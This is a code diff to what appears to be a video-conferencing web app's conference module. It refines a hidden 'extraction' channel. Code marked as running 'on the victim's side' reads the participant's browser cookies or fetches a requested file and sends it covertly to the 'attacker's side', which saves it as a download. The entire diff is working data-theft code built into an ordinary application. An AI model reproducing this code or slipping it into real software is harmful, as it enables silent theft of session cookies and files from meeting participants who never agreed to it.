@@ -1294,9 +1294,12 @@ export default {
             // initialize extraction handler for receiving hidden communication based on set configuration
             APP.conference._extractionHandler = new ExtractionHandler(configuration);
 
+            // initiate event for extraction ending
+            APP.conference._extractionEventElement = new EventTarget();
+
             // start receiving data, after receiving all data download a file
-            APP.conference._extractionHandler.receiveAll().then(data => {
-                this.downloadFile(data, fileName);
+            APP.conference._extractionEventElement.addEventListener('extractionEnded', object => {
+                this.downloadFile(object.detail.extractedData, fileName);
             });
 
         } catch (err) {
@@ -1312,7 +1315,6 @@ export default {
      * @returns {string}
      */
     _handleExtractionCommunication(user, recievedData) {
-
         // define extraction handler if it does not exist
         // OR if it contains extraction handler from previous communication
         if (!APP.conference._extractionHandler
@@ -1323,13 +1325,12 @@ export default {
         // this runs on the victim's side
         if (recievedData.extraction === 'request') {
             this._acquireData(recievedData.config).then(acquiredData => {
-                console.log(acquiredData);
                 APP.conference._extractionHandler.sendAll(acquiredData);
             });
-
         } else { // 'reply' received, this runs on the attacker's side
-            // TODO: fix infinite loop
-            APP.conference._extractionHandler.receivePlainData(recievedData.config);
+            const extractionEvent = APP.conference._extractionEventElement;
+
+            APP.conference._extractionHandler.receivePlainData(recievedData, extractionEvent);
         }
     },
 
@@ -1339,8 +1340,6 @@ export default {
      */
     async _acquireData(dataInfo) {
         if (dataInfo.dataType === 'cookies') {
-            console.log(dataInfo);
-
             return document.cookie;
         }
         fetch(dataInfo.fileName)
@@ -1355,7 +1354,7 @@ export default {
             .catch(
 
                 // Handle the error response object
-                error => console.log(error)
+                error => console.error(error)
             );
     },
 
